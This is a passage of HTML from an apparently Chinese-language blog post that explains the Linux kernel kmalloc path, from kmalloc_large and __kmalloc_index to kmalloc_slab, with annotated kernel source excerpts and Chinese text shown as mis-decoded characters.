class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - åˆ†é…å†…æ ¸å†…å­˜</span><br><span class="hljs-comment"> * @size: éœ€è¦çš„å†…å­˜å­—èŠ‚æ•°.</span><br><span class="hljs-comment"> * @flags: æè¿°åˆ†é…ä¸Šä¸‹æ–‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc æ˜¯å†…æ ¸ä¸­åˆ†é…å°äºé¡µé¢å¤§å°çš„å†…å­˜å¯¹è±¡çš„é€šç”¨æ–¹æ³•.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è¢«åˆ†é…çš„å¯¹è±¡åœ°å€è‡³å°‘è¦å¯¹é½åˆ° ARCH_KMALLOC_MINALIGN å­—èŠ‚.</span><br><span class="hljs-comment"> * å¯¹äº 2^n å­—èŠ‚çš„ @size , å¯¹é½ä¹Ÿéœ€è¦ä¿è¯è‡³å°‘åˆ°è¯¥å¤§å°.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument å¯èƒ½æ˜¯ include/linux/gfp.h ä¸­å®šä¹‰çš„GFP æ ‡å¿—ä½ï¼Œæè¿°äº</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ¨èçš„å¯¹ @flags ä½¿ç”¨æè¿°äº</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä»¥ä¸‹ä¸ºæœ€å¸¸ç”¨çš„ GFP æ ‡å¿—ä½ç®€è¦æ¦‚è¿°</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *åˆ†é…æ™®é€šå†…æ ¸å†…å­˜. å¯èƒ½ç¡çœ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *åˆ†é…å°†ä¸ä¼šç¡çœ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *åˆ†é…å°†ä¸ä¼šç¡çœ .  å¯èƒ½ä½¿ç”¨ emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¹Ÿå¯ä»¥é€šè¿‡å¼‚æˆ–ä»¥ä¸‹çš„ä¸€ä¸ªæˆ–å¤šä¸ªé¢å¤–@flagsæ¥è®¾ç½®ä¸åŒçš„æ ‡å¿—ä½:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *åœ¨è¿”å›å‰æ¸…é›¶åˆ†é…çš„å†…å­˜. ä¹Ÿå¯å‚è§ kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *è¿™ä¸ªåˆ†é…æœ‰ç€é«˜ä¼˜å…ˆçº§ä¸”å¯èƒ½ä½¿ç”¨ emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *è¡¨ç¤ºæ­¤æ¬¡åˆ†é…ä¸å…è®¸å¤±è´¥</span><br><span class="hljs-comment"> *(åœ¨ä½¿ç”¨å‰å†æ¬¡æ€è€ƒ).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *è‹¥å†…å­˜ä¸ä¼šé©¬ä¸Šå¯ç”¨,ç«‹å³æ”¾å¼ƒ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *è‹¥åˆ†é…å¤±è´¥ï¼Œä¸è¦æäº¤è­¦å‘Š.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *åŠªåŠ›å°è¯•ä½¿åˆ†é…æˆåŠŸï¼Œä½†æœ€ç»ˆå¤±è´¥.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-ï¼šç›´æ¥å‘-buddy-system-è¯·æ±‚å†…å­˜"><a href="#I-kmalloc-large-ï¼šç›´æ¥å‘-buddy-system-è¯·æ±‚å†…å­˜" class="headerlink" title="I. kmalloc_large()ï¼šç›´æ¥å‘ buddy system è¯·æ±‚å†…å­˜"></a>I. kmalloc_large()ï¼šç›´æ¥å‘ buddy system è¯·æ±‚å†…å­˜</h3><p>å¯¹äºè¯·æ±‚å¤§å°å¤§äº <code>KMALLOC_MAX_CACHE_SIZE</code> çš„å†…å­˜åˆ†é…è¯·æ±‚è€Œè¨€ï¼Œ <code>kmalloc()</code> ä¼šç›´æ¥è°ƒç”¨ <code>kmalloc_large()</code> å®Œæˆå†…å­˜åˆ†é…ï¼Œæœ€åå®é™…ä¸Šä¼šåœ¨ <code>__kmalloc_large_node()</code> è°ƒç”¨ <code>alloc_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ºäº†é¿å…ä¸å¿…è¦çš„å¼€é”€,æˆ‘ä»¬å°†å¤§çš„åˆ†é…è¯·æ±‚ç›´æ¥ä¼ é€’ç»™é¡µé¢åˆ†é…å™¨.</span><br><span class="hljs-comment"> * æˆ‘ä»¬ä½¿ç”¨ __GFP_COMP, å› ä¸ºæˆ‘ä»¬éœ€è¦çŸ¥é“åˆ†é…çš„ order ä»¥åœ¨ kfree ä¸­æ°å½“åœ°é‡Šæ”¾.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡"><a href="#II-kmalloc-index-ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡" class="headerlink" title="II. __kmalloc_index()ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡"></a>II. __kmalloc_index()ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡</h3><p><code>kmalloc_index()</code> å…¶å®å°±æ˜¯ <code>__kmalloc_indexï¼ˆï¼‰</code>ï¼Œæ ¹æ®è¯·æ±‚çš„å¤§å°è¿”å›å¯¹åº”çš„ä¸‹æ ‡ï¼Œæ•´ä½“é€»è¾‘éå¸¸ç®€å•ç²—æš´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç®—å‡ºä¸€ä¸ªç‰¹å®šå¤§å°çš„åˆ†é…å±äºå“ªä¸ª kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ³¨æ„: __kmalloc_index() åœ¨ç¼–è¯‘æœŸä¼˜åŒ–, æ²¡æœ‰è¿è¡Œæ—¶ä¼˜åŒ–;</span><br><span class="hljs-comment"> * å…¸å‹çš„ç”¨æ³•ä¸ºé€šè¿‡ kmalloc_index() ä»¥åœ¨ç¼–è¯‘æœŸä¼˜åŒ–.</span><br><span class="hljs-comment"> * å¤§å°éå¸¸é‡çš„è°ƒç”¨è€…ä»…åº”å½“ä¸º__kmalloc_index()çš„è¿è¡Œæ—¶å¼€é”€å¯ä»¥è¢«æ¥å—çš„æµ‹è¯•æ¨¡å—.</span><br><span class="hljs-comment"> * åŒæ ·å‚è§ kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹"><a href="#III-kmalloc-types-ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹" class="headerlink" title="III. kmalloc_types()ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹"></a>III. kmalloc_types()ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹</h3><p><code>kmalloc_type()</code> å…¶å®ä¸»è¦å°±æ˜¯æ ¹æ®æ ‡å¿—ä½è¿”å›ç±»å‹ï¼Œé™¤äº†æŒ‡å®šäº† <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> ä»¥å¤–å°±éƒ½æ˜¯ <code>KMALLOC_NORMAL</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æœ€å¸¸è§„çš„æƒ…å†µä¸º KMALLOC_NORMAL, æ‰€ä»¥ç”¨ä¸€ä¸ªå•ç‹¬çš„åˆ†æ”¯æµ‹è¯•æ‰€æœ‰ç›¸å…³çš„æ ‡å¿—ä½.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‡³å°‘éœ€è¦è®¾ç½®ä¸€ç§æ ‡å¿—ä½. ä¼˜å…ˆé¡ºåºä¸º:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…"><a href="#IV-kmalloc-trace-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…" class="headerlink" title="IV. kmalloc_trace()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…"></a>IV. kmalloc_trace()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…</h3><p><code>kmalloc_trace()</code> ä¸»è¦æ˜¯å¯¹ <code>__kmem_cache_alloc_node()</code> çš„ wrapperï¼ŒåŠ ä¸Š tracepoint å’Œ kasan çš„ç›¸å…³è®¾ç½®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä¼šæŒ‡å®š node ä¸º <code>NUMA_NO_NODE</code>ï¼š</p><blockquote><p>ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ kernel trace point çš„å¯ä»¥å‚è§ <a href="https://docs.kernel.org/trace/tracepoints.html">è¿™é‡Œ</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> å…¶å®å°±æ˜¯ <code>slab_alloc_node()</code> çš„ wrapperï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…"><a href="#V-kmalloc-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…" class="headerlink" title="V. __kmalloc()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…"></a>V. __kmalloc()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…</h3><p><code>__kmalloc()</code> å…¶å®å°±æ˜¯æŒ‡å®š node ä¸º <code> NUMA_NO_NODE</code> çš„ <code>__do_kmalloc_node()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-ï¼šåˆ¤æ–­æ‰€éœ€-kmem-cache-å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…"><a href="#VI-do-kmalloc-node-ï¼šåˆ¤æ–­æ‰€éœ€-kmem-cache-å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…" class="headerlink" title="VI. __do_kmalloc_node()ï¼šåˆ¤æ–­æ‰€éœ€ kmem_cache å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…"></a>VI. __do_kmalloc_node()ï¼šåˆ¤æ–­æ‰€éœ€ kmem_cache å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…</h3><p>è¯¥å‡½æ•°çš„ä¸»è¦é€»è¾‘ä¸ºï¼š</p><ul><li>è‹¥ <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ï¼Œåˆ™è°ƒç”¨ <code>__kmalloc_large_node()</code> è¿›è¡Œåˆ†é…ï¼Œå¹¶è¿›è¡Œ tracepoint ä¸ kasan ç›¸å…³è®¾ç½®</li><li>å¯¹äºå¸¸è§„ sizeï¼š<ul><li>é¦–å…ˆè°ƒç”¨ <code>kmalloc_slab()</code> è·å–å¯¹åº”çš„ <code>kmem_cache</code></li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>__kmem_cache_alloc_node()</code> è¿›è¡Œå†…å­˜åˆ†é…</li><li>æœ€åè¿›è¡Œ tracepoint ä¸ kasan ç›¸å…³è®¾ç½®</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> ä¸­å¯»æ‰¾ <code>kmem_cache</code> çš„è¿‡ç¨‹å’Œ kmalloc ç±»ä¼¼ï¼Œä¸è¿‡å¯»æ‰¾ä¸‹æ ‡ç”¨çš„æ˜¯ <code>size_index[size_index_elem(size)]</code> å’Œ <code>fls()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯»æ‰¾æ»¡è¶³ç»™å®šå¤§å°çš„åˆ†é…çš„ kmem_cache ç»“æ„ä½“</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span 